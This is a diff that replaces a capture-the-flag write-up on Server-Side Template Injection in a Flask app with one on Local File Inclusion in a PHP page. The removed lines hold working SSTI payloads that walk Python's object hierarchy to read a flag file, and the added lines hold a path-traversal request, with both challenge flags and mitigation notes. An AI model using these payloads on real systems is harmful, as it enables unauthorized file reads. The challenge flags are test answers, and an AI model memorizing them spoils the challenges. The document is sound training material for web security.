@@ -1,49 +1,35 @@
-Basic SSTI Challenge Write-Up
+Basic LFI Challenge Write-Up
 
 Challenge Overview
-Name: SSTI Challenge
+Name: Basic LFI Challenge
 Category: Web Exploitation
-Difficulty: Medium
-Description: This challenge tests your ability to exploit a Server-Side Template Injection (SSTI) vulnerability in a Flask-based web application. The objective is to retrieve the hidden flag from the server by leveraging Python’s object hierarchy.
+Difficulty: Easy
+Description: This challenge tests your ability to exploit a Local File Inclusion (LFI) vulnerability in a web application. The objective is to retrieve the hidden flag from the server.
 
 Objectives
-Exploit the SSTI vulnerability to retrieve the flag from /var/www/html/flag.txt.
+Exploit the LFI vulnerability in the example.php file to read the flag.txt file.
 
 Tools Required
 Web browser
-Basic understanding of Jinja2 and Python object traversal
+Basic knowledge of web server file structure
 
 Solution Steps
 Step 1: Explore the Application
-Access the web application through the provided URL: 
-http://localhost:8080
-You will see a landing page that displays the message: 
-"Hello, send something inside the param 'c'!"
+Access the web application through the provided URL: http://localhost:8080. You will find a simple landing page (index.html) that links to example.php.
 
-Step 2: Test for Template Injection
-Verify that the application is vulnerable to SSTI by passing a basic payload in the c parameter:
-http://localhost:8080/?c={{7*7}}
-If successful, you will see the result of the arithmetic operation (49) rendered on the page.
+Step 2: Investigate the Vulnerability
+Navigate to the vulnerable PHP page by clicking the link or directly visiting: http://localhost:8080/example.php?file=home.html This page includes files based on a user-supplied file parameter, which is vulnerable to Local File Inclusion.
 
-Step 3: Investigate Python Object Traversal
-Use Python’s __class__ and __subclasses__ methods to explore the object hierarchy:
-http://localhost:8080/?c={{'abc'.__class__.__base__.__subclasses()}}
-This will display a list of subclasses of Python’s object class, allowing you to find classes related to file handling.
+Step 3: Exploit the LFI
+To exploit the vulnerability and read the contents of flag.txt, manipulate the file parameter to traverse the directory: http://localhost:8080/example.php?file=../flag.txt
 
-Step 4: Identify the File Handling Class
-Locate the file handler class (e.g., <class '_io.TextIOWrapper'>) within the object hierarchy. The exact index may vary by environment; for example:
-http://localhost:8080/?c={{'abc'.__class__.__base__.__subclasses__()[92]}}
-This will print the class that allows file access.
-
-Step 5: Read the Flag File
-Use the file handler class to read the flag file located at /var/www/html/flag.txt:
-http://localhost:8080/?c={{'abc'.__class__.__base__.__subclasses__()[92]('/var/www/html/flag.txt').read()}}
-If successful, the content of the flag file will be displayed.
+Step 4: Capture the Flag
+If the LFI exploit is successful, the content of flag.txt should be displayed on your browser. This content is the flag you need to submit to complete the challenge.
 
 Flag
-flag{SepalAI_SSTI_Challenge_R3m0t3_C0de_3x3c}
+flag{SepalAI_CTF_2024_secretkey}
 
 Notes
-Challenge Purpose: This challenge demonstrates the risks associated with unsanitized template rendering in Flask applications.
-Mitigation: Use proper input sanitization and restrict access to dangerous methods like __class__ and __subclasses__.
+LFI: Local File Inclusion vulnerabilities occur when user input is used to include files in the application, allowing attackers to read sensitive files.
+Mitigation: Always sanitize user inputs to prevent path traversal and restrict file inclusion to trusted files only.
 
